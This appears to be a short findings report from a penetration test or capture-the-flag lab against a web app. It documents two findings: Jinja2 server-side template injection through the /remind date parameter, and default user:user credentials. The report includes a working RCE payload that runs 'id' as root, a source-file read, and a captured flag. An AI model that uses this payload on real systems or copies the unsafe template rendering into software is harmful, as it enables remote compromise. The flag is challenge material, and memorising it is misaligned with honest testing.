findings.title: Server-Side Template Injection (SSTI) via /remind?date= — RCE as root
findings.description: The /remind endpoint takes a user-controlled 'date' parameter and injects it into a Jinja2 template string using Python's str.format() before passing it to render_template_string(). This allows an attacker to inject arbitrary Jinja2 template expressions, achieving Remote Code Execution as root. Credentials user:user (default) are required to reach the endpoint.
findings.evidence:
SSTI PoC: GET /remind?date={{7*7}} → 'Reminder will be sent on 49'
RCE PoC: GET /remind?date={{config.__class__.__init__.__globals__['os'].popen('id').read()}} → 'uid=0(root) gid=0(root) groups=0(root)'
Source code read: cat /app/app.py confirmed render_template_string(message) where message = '...{}'.format(date)
Container hostname: 2592c48e318b, running as root
FLAG: flag{7e0416f5-d2b9-4faf-94c2-de7a39664d4c}

findings.title: Default Credentials: user:user
findings.description: The application ships with hardcoded default credentials user:user that are created on first startup via before_request hook. Any unauthenticated user can log in with these credentials.
findings.evidence: POST /login with username=user&password=user returns HTTP 302 redirect to /transactions (successful login)
